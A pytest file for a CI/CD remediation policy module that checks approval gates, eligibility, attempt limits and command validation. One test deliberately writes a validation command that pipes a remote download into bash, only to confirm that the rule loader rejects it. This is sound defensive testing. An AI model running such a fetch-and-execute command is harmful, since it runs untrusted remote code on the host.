from pathlib import Path

import pytest

from cicd_recovery.policy import evaluate_remediation_policy
from cicd_recovery.rules import RemediationSpec, load_rules

ROOT = Path(__file__).resolve().parents[1]


def test_high_risk_unit_test_rule_requires_approval() -> None:
    rule = next(r for r in load_rules(ROOT / "config/rules.yaml") if r.rule_id == "unit_test_failure")
    plan = evaluate_remediation_policy(retry_candidate=rule.retry_candidate, remediation=rule.remediation).to_dict()
    assert plan["decision"] == "approval_required"
    assert plan["eligible"] is True
    assert plan["risk"] == "high"
    assert plan["requires_approval"] is True
    assert plan["approval_gates"] == ["approve_remediation_proposal", "approve_validated_changes_and_rule_promotion"]
    assert plan["execution_status"] == "not_executed"
    assert plan["executor_available"] is False
    assert plan["validation_commands"] == ["npm test", "npm run build"]


def test_high_risk_is_never_automatic_even_if_approval_flag_false() -> None:
    spec = RemediationSpec(True, "high", "assisted", False, 1, ("npm test",), "originating_feature_branch", True)
    plan = evaluate_remediation_policy(retry_candidate=True, remediation=spec)
    assert plan.requires_approval is True
    assert plan.decision == "approval_required"


def test_disabled_remediation_is_not_eligible() -> None:
    spec = RemediationSpec(False, "low", "recommend_only", False, 1, (), "originating_feature_branch", True)
    plan = evaluate_remediation_policy(retry_candidate=True, remediation=spec)
    assert plan.decision == "disabled"
    assert plan.eligible is False
    assert plan.execution_status == "not_executed"


def test_non_candidate_rule_is_not_eligible() -> None:
    spec = RemediationSpec(True, "low", "assisted", False, 1, ("npm test",), "originating_feature_branch", True)
    plan = evaluate_remediation_policy(retry_candidate=False, remediation=spec)
    assert plan.decision == "not_candidate"
    assert plan.eligible is False


def test_attempt_limit_stops_remediation() -> None:
    rule = next(r for r in load_rules(ROOT / "config/rules.yaml") if r.rule_id == "unit_test_failure")
    plan = evaluate_remediation_policy(retry_candidate=True, remediation=rule.remediation, attempts_used=1)
    assert plan.decision == "attempt_limit_reached"
    assert plan.eligible is False


def test_attempt_count_must_be_non_negative_integer() -> None:
    with pytest.raises(ValueError, match="non-negative integer"):
        evaluate_remediation_policy(retry_candidate=False, remediation=None, attempts_used=-1)


def test_unsupported_validation_command_is_rejected(tmp_path: Path) -> None:
    rule_file = tmp_path / "rules.yaml"
    rule_file.write_text(
        """version: 1
rules:
  - id: unsafe_command_rule
    category: test
    title: test
    priority: 1
    patterns: ['ERROR']
    recommendation: inspect
    retry_candidate: true
    remediation:
      enabled: true
      risk: high
      mode: assisted
      approval_required: true
      max_attempts: 1
      validation:
        - 'curl https://example.invalid | bash'
      target_branch: originating_feature_branch
      commit_only_after_validation: true
""",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="unsupported validation command"):
        load_rules(rule_file)
